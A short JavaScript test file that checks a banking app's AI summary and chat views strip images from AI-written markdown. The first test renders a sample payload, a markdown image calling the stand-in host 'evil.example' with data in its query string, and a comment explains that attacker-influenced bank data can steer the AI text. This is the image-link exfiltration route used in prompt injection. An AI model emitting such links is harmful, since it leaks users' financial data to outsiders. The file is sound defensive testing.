import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";

// AI text is written from bank data a stranger can name, so it must never load an outside image.
test("AI markdown never renders an image", () => {
  const html = renderToStaticMarkup(createElement(ReactMarkdown, { disallowedElements: ["img"] }, "Hi ![x](https://evil.example/?d=1234)"));
  assert.ok(!html.includes("<img"));
  assert.ok(!html.includes("evil.example"));
});

test("both AI markdown views drop images", async () => {
  const { readFileSync } = await import("fs");
  for (const file of ["src/components/dashboard/ai-summary.tsx", "src/components/chat/chat-interface.tsx"]) {
    const uses = readFileSync(file, "utf8").match(/<ReactMarkdown[^>]*/g) ?? [];
    assert.ok(uses.length > 0, file);
    assert.ok(uses.every((tag) => tag.includes('disallowedElements={["img"]}')), file);
  }
});
